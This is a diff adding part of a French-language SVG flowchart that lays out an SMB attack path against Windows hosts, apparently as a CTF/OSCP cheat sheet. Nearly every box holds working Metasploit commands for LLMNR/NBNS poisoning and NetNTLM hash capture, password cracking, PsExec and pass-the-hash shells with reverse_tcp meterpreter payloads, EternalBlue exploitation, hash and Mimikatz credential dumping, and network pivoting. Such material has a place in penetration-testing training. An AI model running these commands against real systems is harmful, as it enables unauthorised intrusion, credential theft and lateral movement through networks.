+<text x="1316" y="2970" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Creds valides trouvés ?</text>
+<rect x="1303" y="3054" width="540" height="255" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="3051" width="540" height="255" rx="8" fill="#0d1117" stroke="#da3633" stroke-width="2"/>
+<rect x="1300" y="3051" width="540" height="36" rx="8" fill="#da3633" fill-opacity="0.15"/>
+<rect x="1300" y="3079" width="540" height="8" fill="#da3633" fill-opacity="0.15"/>
+<rect x="1754.0" y="3059" width="76.0" height="20" rx="4" fill="#da3633" fill-opacity="0.3"/>
+<text x="1792.0" y="3073" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#da3633">DEAD END</text>
+<text x="1316" y="3075" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Brute-force échoué</text>
+<rect x="1316" y="3099" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="3115" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># LLMNR/NBNS Poisoning :</text>
+<text x="1324" y="3131" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/spoof/llmnr/llmnr_response</text>
+<text x="1324" y="3147" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/spoof/nbns/nbns_response</text>
+<rect x="1316" y="3163" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="3179" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Capturer hashes NetNTLM :</text>
+<text x="1324" y="3195" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/server/capture/smb</text>
+<text x="1324" y="3211" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set JOHNPWFILE /tmp/hashes.txt</text>
+<text x="1324" y="3227" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="3243" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="3259" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Cracker offline :</text>
+<text x="1324" y="3275" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># john /tmp/hashes.txt --wordlist=rockyou.txt</text>
+<rect x="673" y="3344" width="540" height="303" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="3341" width="540" height="303" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="3341" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="3369" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="3349" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="3363" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="3365" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">9. Valider les Identifiants</text>
+<rect x="686" y="3389" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="3405" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_login</text>
+<text x="694" y="3421" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="694" y="3437" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="694" y="3453" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="694" y="3469" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="3485" width="500" height="104" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="3501" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Vérifier l&#x27;accès admin :</text>
+<text x="694" y="3517" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</text>
+<text x="694" y="3533" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="694" y="3549" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="694" y="3565" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="694" y="3581" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Si ADMIN$ et C$ listés → admin confirmé</text>
+<text x="686" y="3601" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 ADMIN$ + C$ accessibles = droits admin.</text>
+<rect x="673" y="3682" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="3679" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="670" y="3679" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="670" y="3707" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1124.0" y="3687" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1162.0" y="3701" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="686" y="3703" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Accès Admin ? (ADMIN$ visible)</text>
+<rect x="673" y="3787" width="540" height="411" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="3784" width="540" height="411" rx="8" fill="#0d1117" stroke="#238636" stroke-width="2"/>
+<rect x="670" y="3784" width="540" height="36" rx="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="670" y="3812" width="540" height="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="1131.5" y="3792" width="68.5" height="20" rx="4" fill="#238636" fill-opacity="0.3"/>
+<text x="1165.75" y="3806" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#238636">SUCCESS</text>
+<text x="686" y="3808" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">10. Obtenir un Shell (Admin)</text>
+<rect x="686" y="3832" width="500" height="136" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="3848" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># PsExec (méthode principale) :</text>
+<text x="694" y="3864" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/psexec</text>
+<text x="694" y="3880" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="694" y="3896" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="694" y="3912" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="694" y="3928" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set PAYLOAD windows/meterpreter/reverse_tcp</text>
+<text x="694" y="3944" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set LHOST &lt;TON_IP&gt;</text>
+<text x="694" y="3960" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="3976" width="500" height="104" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="3992" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Si PsExec échoue — PowerShell :</text>
+<text x="694" y="4008" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/psexec_psh</text>
+<text x="694" y="4024" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="694" y="4040" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="694" y="4056" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="694" y="4072" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="4088" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4104" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Pass-the-Hash :</text>
+<text x="694" y="4120" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/psexec</text>
+<text x="694" y="4136" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;LM:NTLM&gt;</text>
+<text x="686" y="4156" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 PsExec nécessite ADMIN$ accessible. AV peut bloquer.</text>
+<rect x="673" y="4233" width="540" height="375" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="4230" width="540" height="375" rx="8" fill="#0d1117" stroke="#238636" stroke-width="2"/>
+<rect x="670" y="4230" width="540" height="36" rx="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="670" y="4258" width="540" height="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="1131.5" y="4238" width="68.5" height="20" rx="4" fill="#238636" fill-opacity="0.3"/>
+<text x="1165.75" y="4252" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#238636">SUCCESS</text>
+<text x="686" y="4254" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">11. Post-Exploitation Meterpreter</text>
+<rect x="686" y="4278" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4294" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; getuid</text>
+<text x="694" y="4310" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; sysinfo</text>
+<rect x="686" y="4326" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4342" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Dump des hashes :</text>
+<text x="694" y="4358" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; hashdump</text>
+<rect x="686" y="4374" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4390" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Mimikatz intégré :</text>
+<text x="694" y="4406" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; load kiwi</text>
+<text x="694" y="4422" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; creds_all</text>
+<text x="694" y="4438" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; kiwi_cmd lsadump::sam</text>
+<rect x="686" y="4454" width="500" height="104" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4470" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Pass-the-Hash pivoting :</text>
+<text x="694" y="4486" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run autoroute -s &lt;SUBNET&gt;/24</text>
+<text x="694" y="4502" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/psexec</text>
+<text x="694" y="4518" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;LM:NTLM&gt;</text>
+<text x="694" y="4534" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;NEXT_TARGET&gt;</text>
+<text x="694" y="4550" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="686" y="4570" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 autoroute permet de scanner le réseau interne via le pivot.</text>
+<rect x="43" y="3787" width="540" height="351" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="3784" width="540" height="351" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="40" y="3784" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="40" y="3812" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="509.0" y="3792" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="539.5" y="3806" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="56" y="3808" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">10b. Accès Limité (non-admin)</text>
+<rect x="56" y="3832" width="500" height="120" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="3848" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Explorer les shares autorisés :</text>
+<text x="64" y="3864" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</text>
+<text x="64" y="3880" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="64" y="3896" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="64" y="3912" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set ShowFiles true</text>
+<text x="64" y="3928" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SpiderShares true</text>
+<text x="64" y="3944" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="56" y="3960" width="500" height="120" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="3976" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Télécharger des fichiers :</text>
+<text x="64" y="3992" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/admin/smb/download_file</text>
+<text x="64" y="4008" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &lt;USER&gt;</text>
+<text x="64" y="4024" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &lt;PASS&gt;</text>
+<text x="64" y="4040" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBSHARE &lt;share&gt;</text>
+<text x="64" y="4056" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RPATH &lt;chemin&gt;</text>
+<text x="64" y="4072" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="56" y="4092" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Chercher des creds pour escalader vers admin.</text>
+<rect x="1303" y="845" width="540" height="379" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="842" width="540" height="379" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="1300" y="842" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1300" y="870" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1769.0" y="850" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1799.5" y="864" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="1316" y="866" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">⚡ Check EternalBlue (MS17-010)</text>
+<rect x="1316" y="890" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="906" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Scanner :</text>
+<text x="1324" y="922" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</text>
+<text x="1324" y="938" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="954" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="970" width="500" height="104" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="986" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Exploit si vulnérable :</text>
+<text x="1324" y="1002" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</text>
+<text x="1324" y="1018" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="1034" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set LHOST &lt;TON_IP&gt;</text>
+<text x="1324" y="1050" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set PAYLOAD windows/x64/meterpreter/reverse_tcp</text>
+<text x="1324" y="1066" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="1082" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="1098" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Variante Windows anciens :</text>
+<text x="1324" y="1114" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/smb/ms17_010_psexec</text>
+<text x="1324" y="1130" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="1146" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set LHOST &lt;TON_IP&gt;</text>
+<text x="1324" y="1162" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="1316" y="1182" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Windows 7/2008 R2 non patché. Très courant en CTF/OSCP.</text>
+
+<!-- ═══ ARROWS ═══ -->
+<path d="M 940.0 215 L 940.0 244" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 549 L 940.0 578" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 1081 L 940.0 1110" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 1925 L 940.0 1954" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 310.0 2388 L 310.0 2417" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 310.0 2763 L 310.0 2792" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 1570.0 2911 L 1570.0 2940" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 3644 L 940.0 3673" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 4195 L 940.0 4224" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 654 L 940.0 836" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="942.0" y="734.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="958.0" y="747.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 1210 619.0 L 1294 695.5" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1236.0" y="636.25" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="1252.0" y="649.25" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 1210 961.5 L 1294 1031.5" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<text x="1255.0" y="949.5" text-anchor="middle" font-family="monospace" font-size="10" fill="#8b949e">SMBv1 ?</text>
+<path d="M 670 1151.0 L 625 1151.0 L 625 1241 L 310.0 1241 L 310.0 1250" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="631.5" y="1130.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="647.5" y="1143.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 1210 1151.0 L 1255 1151.0 L 1255 1241 L 1570.0 1241 L 1570.0 1250" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1216.5" y="1130.0" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="1232.5" y="1143.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 310.0 1619 L 310.0 1634 L 940.0 1634 L 940.0 1648" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 1570.0 1603 L 1570.0 1634 L 940.0 1634 L 941.0 1648" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 670 1995.0 L 625 1995.0 L 625 2050 L 310.0 2050 L 310.0 2059" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="631.5" y="1974.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="647.5" y="1987.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 1210 1995.0 L 1255 1995.0 L 1255 2050 L 1570.0 2050 L 1570.0 2059" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1216.5" y="1974.0" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="1232.5" y="1987.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 310.0 2493 L 310.0 2522" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="312.0" y="2496.5" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="328.0" y="2509.5" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 580 2458.0 L 625 2458.0 L 625 2508 L 1255 2508 L 1255 2100.0 L 1294 2100.0" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="586.5" y="2437.0" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="602.5" y="2450.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 1300 2100.0 L 1255 2100.0 L 1255 3321 L 955.0 3321 L 955.0 3335" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1261.5" y="2079.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="1277.5" y="2092.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 1570.0 2135 L 1570.0 2522" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1572.0" y="2317.5" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="1588.0" y="2330.5" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 1300 2981.0 L 1255 2981.0 L 1255 3321 L 970.0 3321 L 970.0 3335" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1261.5" y="2960.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="1277.5" y="2973.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 1570.0 3016 L 1570.0 3045" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="1572.0" y="3019.5" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="1588.0" y="3032.5" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+<path d="M 580 2833.0 L 625 2833.0 L 625 3321 L 925.0 3321 L 925.0 3335" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="586.5" y="2812.0" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="602.5" y="2825.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 940.0 3749 L 940.0 3778" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="942.0" y="3752.5" width="32" height="18" rx="4" fill="#238636" fill-opacity="0.2"/>
+<text x="958.0" y="3765.5" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#238636">OUI</text>
+<path d="M 670 3714.0 L 625 3714.0 L 625 3769 L 310.0 3769 L 310.0 3778" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<rect x="631.5" y="3693.0" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
+<text x="647.5" y="3706.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+
+</svg>
